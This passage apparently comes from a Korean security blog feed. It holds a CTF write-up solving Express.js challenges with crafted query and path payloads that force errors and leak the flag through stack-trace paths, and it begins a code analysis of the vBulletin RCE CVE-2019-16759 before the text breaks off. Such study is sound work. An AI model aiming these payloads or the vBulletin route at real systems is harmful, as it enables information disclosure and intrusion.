class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">  res.end(<span class="string">&quot;Close, but no cigar.&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">  res.end(FLAG)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>try/catch 문을 보면 catch 문에서 flag를 출력해주는 것을 볼 수 있습니다. catch 문으로 가기 위해서는 try 문에서 에러를 내뱉게 해야 합니다. <code>const k = &#39;&lt;&#39; + req.query.X + &#39;&gt;&#39;</code>를 보면 문자열과 오브젝트 값을 더해주는 것을 볼 수 있습니다.</strong><br></p><p><strong>Object와 문자열을 더해주면 오브젝트 값을 암시적으로 문자열로 변환해주는 메서드를 호출한다고 합니다. Javascript에서는 문자열로 변환해주는 메서드는 toString() 입니다.</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">＞ <span class="keyword">var</span> a = &#123;<span class="attr">toString</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">＞ secret.length</span><br><span class="line"><span class="number">1</span></span><br><span class="line">＞ <span class="keyword">const</span> s = <span class="string">&#x27;&lt;&#x27;</span> + a + <span class="string">&#x27;&gt;&#x27;</span>;</span><br><span class="line">ⓧ ▶Uncaught <span class="built_in">TypeError</span>: Cannot convert object to primitive value</span><br><span class="line">      at &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>Object 값으로 toString으로 보내줬습니다. 그 다음 <code>const s = &#39;&lt;&#39; + a + &#39;&gt;&#39;;</code>에서는 a 의 값이 Object이기 때문에 toString를 호출하게 됩니다. 이때 toString을 <code>a.toString</code> 이렇게 호출하게 되는데 a의 toString 값은 위에 보면 ‘’로 재정의  때문에 Object를 문자열로 변환해주지 못 해 에러가 발생하게 됩니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve Payload : http:&#x2F;&#x2F;challenges.gynvael.stream:5002&#x2F;?X[length]&#x3D;801&amp;X[toString]</span><br></pre></td></tr></table></figure><p><code>FLAG : CTF&#123;WaaayBeyondPHPLikeWTF&#125;</code></p><hr><h3 id="Challenge-3"><a href="#Challenge-3" class="headerlink" title="Challenge 3"></a>Challenge 3</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Level <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// IMPORTANT <span class="doctag">NOTE:</span></span></span><br><span class="line"><span class="comment">// The secret flag you need to find is in the path name of this JavaScript file.</span></span><br><span class="line"><span class="comment">// So yes, to solve the task, you just need to find out what&#x27;s the path name of</span></span><br><span class="line"><span class="comment">// this node.js/express script on the filesystem and that&#x27;s it.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">5003</span></span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG || <span class="string">&quot;???&quot;</span></span><br><span class="line"><span class="keyword">const</span> SOURCE = fs.readFileSync(path.basename(__filename))</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line">  res.write(<span class="string">&quot;Level 3\n\n&quot;</span>)</span><br><span class="line">  res.end(SOURCE)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/truecolors/:color&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> color = (<span class="string">&#x27;color&#x27;</span> <span class="keyword">in</span> req.params) ? req.params.color : <span class="string">&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (color === <span class="string">&#x27;red&#x27;</span> || color === <span class="string">&#x27;green&#x27;</span> || color === <span class="string">&#x27;blue&#x27;</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&#x27;Yes! A true color!&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.end(<span class="string">&#x27;Hmm? No.&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Challenge listening at port <span class="subst">$&#123;PORT&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>위쪽에 디스크립션을 보면 flag는 javascript 파일이 위치한 경로 파일 이름으로 되어 있다고 합니다. 하지만 코드를 보면 알겠지만 Path Traversal 취약점이 발생할 만한 곳은 존재하지 않습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TypeError: Cannot convert object to primitive value</span><br><span class="line">    at &#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;app.js:9:19</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at next (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13)</span><br><span class="line">    at Route.dispatch (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at &#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22</span><br><span class="line">    at Function.process_params (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br><span class="line">    at next (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:275:10)</span><br><span class="line">    at expressInit (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;middleware&#x2F;init.js:40:5)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br></pre></td></tr></table></figure><p><strong>하지만 위에러를 보면 에러가 발생한 위치를 절대 경로로 알려주고 있는 것을 볼 수 있습니다. 그러니 해당 문제에서도 에러를 내뱉게만 하면 어디에서 에러가 났는 지 절대 경로로 보여줄 건데, 그때 경로에서 flag를 찾을 수 있을 것 입니다. (위 에러는 문제와 상관 없음)</strong><br></p><p><strong>이렇게 시나리오는 구성했지만 에러를 어디서 내뱉게 해야 할 지 몰라 삽질을 조금 많이 했습니다.</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/truecolors/:color&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> color = (<span class="string">&#x27;color&#x27;</span> <span class="keyword">in</span> req.params) ? req.params.color : <span class="string">&#x27;???&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>위 코드를 보면 값을 req.params를 이용해서 color의 값을 받아오는 것을 볼 수 있습니다.</strong><br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/aa.png?raw=true"><br><strong>req.params에 대해 조금 찾아보니 req.params를 이용해서 값을 받으면, 자동으로 <code>decodeUriComponent()</code> 메서드를 이용해서 값을 디코딩한다고 합니다.</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">decodeURIComponent</span>(<span class="string">&#x27;%E0%A4%A&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.error(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// URIError: malformed URI sequence</span></span><br></pre></td></tr></table></figure><p><strong>MDN Web Docs에서 decodeURLComponent() 메서드를 확인해 보니 인자 값으로 위와 같은 값이 들어오면 에러를 내뱉는 다는 것을 알 수 있었습니다.</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%61&quot;</span>);</span><br><span class="line"><span class="string">&quot;a&quot;</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%62&quot;</span>);</span><br><span class="line"><span class="string">&quot;b&quot;</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%63&quot;</span>);</span><br><span class="line"><span class="string">&quot;c&quot;</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%AA&quot;</span>);</span><br><span class="line">ⓧ ▶Uncaught <span class="built_in">URIError</span>: URI malformed</span><br><span class="line">    at <span class="built_in">decodeURIComponent</span> (&lt;anonymous&gt;)</span><br><span class="line">    at &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">1</span></span><br><span class="line">(anonymous) @ VM208:<span class="number">1</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%-&quot;</span>);</span><br><span class="line">ⓧ ▶Uncaught <span class="built_in">URIError</span>: URI malformed</span><br><span class="line">    at <span class="built_in">decodeURIComponent</span> (&lt;anonymous&gt;)</span><br><span class="line">    at &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>그래서 왜 에러가 나는 지 확인을 해보니 ascii code 범위를 벗어나 매칭 되는 값이 없어서 에러가 나는 거 같았습니다. %AA ~ %FF 이 외에도 여러가지 값들을 다 넣어보니 모두 에러가 나는 것을 확인했습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">URIError: Failed to decode param &#39;%-&#39;</span><br><span class="line">    at decodeURIComponent (&lt;anonymous&gt;)</span><br><span class="line">    at decode_param (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:172:12)</span><br><span class="line">    at Layer.match (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:148:15)</span><br><span class="line">    at matchLayer (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:574:18)</span><br><span class="line">    at next (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:220:15)</span><br><span class="line">    at expressInit (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;middleware&#x2F;init.js:40:5)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at trim_prefix (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:317:13)</span><br><span class="line">    at &#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:284:7</span><br><span class="line">    at Function.process_params (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br></pre></td></tr></table></figure><p><strong>그래서 color의 값으로 %-을 주니 에러가 났고, 예상대로 절대 경로 모두 출력됐고, 절대 경로 내에 flag가 있었습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve Payload : http:&#x2F;&#x2F;challenges.gynvael.stream:5003&#x2F;truecolors&#x2F;%-</span><br></pre></td></tr></table></figure><p><code>FLAG : CTF&#123;TurnsOutItsNotRegexFault&#125;</code></p><hr><h3 id="Challenge-4"><a href="#Challenge-4" class="headerlink" title="Challenge 4"></a>Challenge 4</h3><p>(Writing)</p><hr><h3 id="Challenge-5"><a href="#Challenge-5" class="headerlink" title="Challenge 5"></a>Challenge 5</h3><p>(Writing)</p><hr><h3 id="Challenge-6"><a href="#Challenge-6" class="headerlink" title="Challenge 6"></a>Challenge 6</h3><p>(Writing)</p><hr>]]></content>
      
      
      <categories>
          
          <category> Express.js Challenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Express.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0-day RCE in vBulletin</title>
      <link href="2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/"/>
      <url>2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/</url>
      
        <content type="html"><![CDATA[<p><strong>vBulletin에서 발견된 0-day 취약점을 분석해보겠습니다. vBulletin은 외국에서 사용하는 포럼 툴이라고 합니다. 한국 말로 풀어 쓰면 토론형 게시판이라고 볼 수 있겠습니다. 여하튼 이 포럼 툴에서 RCE 취약점이 총 2번 발견 되었습니다. </strong><br><br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2019-16759</td><td>5.x ~ 5.5.4</td><td>9.8</td></tr><tr><td>CVE-2020-7373</td><td>5.5.4 ~ 5.6.2</td><td>9.8</td></tr></tbody></table><p><br><strong>처음에는 <code>CVE-2019-16759</code>라는 취약점이 나왔었고, 취약한 버전은 5.x부터 5.5.4까지라고 합니다. 해당 취약점은 9월 24일에 처음 POC가 공개되었고, 바로 다음 날인 25일에 패치가 됐다고 합니다.<strong><br></p><p><strong>하지만 완전히 패치된 줄 알았던 0-day 취약점이 한 보안 연구원에 의해서 또 다시 뚫리고 말았습니다. <code>CVE-2020-7373</code>라는 CVE ID로 나왔었고, 취약한 버전은 5.5.4부터 5.6.2까지라고 합니다. 그럼 한 번 RCE가 어떻게 트리거 됐는지 코드 분석을 통해 알아보겠습니다.</strong><br><br></p><hr><h2 id="CVE-2019-16759"><a href="#CVE-2019-16759" class="headerlink" title="CVE-2019-16759"></a><em>CVE-2019-16759</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="comment">//For a few set routes we can run a streamlined funcction.</span></span><br><span class="line"><span class="keyword">if</span> (vB5_Frontend_ApplicationLight::isQuickRoute())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$app</span> = vB5_Frontend_ApplicationLight::init(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$app</span>-&gt;execute())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>취약점의 시작은 index.php에서 시작이 됩니다. <code>isQuickRoute()</code>의 값이 참이면 if 문 내부로 들어가는 것을 볼 수 있습니다. isQuickRoute 메서드는 <code>includes/vb5/frontend/applicationlight.php</code> 내부에 정의되어 있습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Tells whether this class can process this request</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> boll</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">isQuickRoute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$quickRoutes</span>[<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]]))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>], <span class="number">0</span>, <span class="number">8</span>) == <span class="string">&#x27;ajax/api&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>], <span class="number">0</span>, <span class="number">11</span>) == <span class="string">&#x27;ajax/render&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><code>includes/vb5/frontend/applicationlight.php</code> 내부에는 위와 같이 isQuickRoute 메서드가 정의되어 있는데 routestring의 값이 <code>&#39;ajax/api&#39;</code>, <code>&#39;ajax/render&#39;</code>이면 ture를 반환해 vB5_Frontend_ApplicationLight::init가 실행이 됩니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**Standard constructor. We only access application throuth init() **/</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring]))</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            return false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if (isset(self::$quickRoutes[$_REQUEST[&#x27;</span>routestring<span class="string">&#x27;]]))</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = self::$quickRoutes[$_REQUEST[&#x27;</span>routestring]];</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring], 0, 8) == &#x27;</span>ajax/api<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = array(&#x27;</span>handler<span class="string">&#x27; =&gt; &#x27;</span>handleAjaxApi<span class="string">&#x27;, &#x27;</span><span class="built_in">static</span><span class="string">&#x27; =&gt; false);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            if (substr($_REQUEST[&#x27;</span>routestring<span class="string">&#x27;], 0, 17) == &#x27;</span>ajax/api/cron/run<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                $this-&gt;application[&#x27;</span>runcron<span class="string">&#x27;] = true;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            return true;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if (substr($_REQUEST[&#x27;</span>routestring<span class="string">&#x27;], 0, 11) == &#x27;</span>ajax/render<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = array(&#x27;</span>handler<span class="string">&#x27; =&gt; &#x27;</span>callRender<span class="string">&#x27;, &#x27;</span><span class="built_in">static</span><span class="string">&#x27; =&gt; false);</span></span><br><span class="line"><span class="string">            return true;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        return false;  </span></span><br><span class="line"><span class="string">    &#125;    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(생략)</span></span><br></pre></td></tr></table></figure><p><strong>index.php에서 vB5_Frontend_ApplicationLight::init 메서드가 실행되면 위 __construct 메서드가 실행됩니다. 코드 하단에 보면 <code>routestring</code>의 값이 <code>&#39;ajax/render&#39;</code>이면 handler로 callRender 메서드가 설정되어 있는 것을 볼 수 있습니다. callRender 메서드도 <code>includes/vb5/frontend/applicationlight.php</code> 내부에 정의되어 있습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** This renders a template from an ajax call</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">callRender</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$routeInfo</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (count(<span class="variable">$routeInfo</span>) &lt; <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">&#x27;ajax&#x27;</span>, <span class="string">&#x27;api&#x27;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;invalid_request&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$params</span> = array_merge(<span class="variable">$_POST</span>, <span class="variable">$_GET</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">        <span 